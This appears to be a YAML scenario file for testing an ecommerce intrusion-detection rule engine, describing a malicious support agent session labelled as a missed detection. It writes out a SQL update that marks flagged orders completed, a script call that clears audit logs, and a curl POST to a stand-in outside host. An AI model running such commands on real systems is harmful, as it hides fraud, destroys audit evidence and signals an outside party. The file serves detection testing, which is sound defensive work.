scenario_id: ecommerce_run_03_order_status_conceal_mal
family_id: ecommerce_run_03_fam_order_conceal
domain: ecommerce
default_class: malicious
rule_engine_relationship: malicious_false_negative
time_of_day: "04:30"
sessions:
  - session_label: conceal
    role: support_agent
    anchor: db
    timing:
      tempo: bursty
      step_gaps_seconds: [1.0]
    events:
      - step_id: bulk_conceal
        sql: "UPDATE orders SET status = 'completed' WHERE status = 'flagged'"
      - step_id: cover_tracks
        process: {comm: bash, args: ["/tmp/clear_audit.sh", "--quiet"], parent: bulk_conceal}
      - step_id: exfil_confirm
        process: {comm: curl, args: ["-sX", "POST", "https://sync.datasink.example/ack", "--data", "done"], parent: cover_tracks}
        connects_to: {ip: "141.98.11.23", port: 8443}
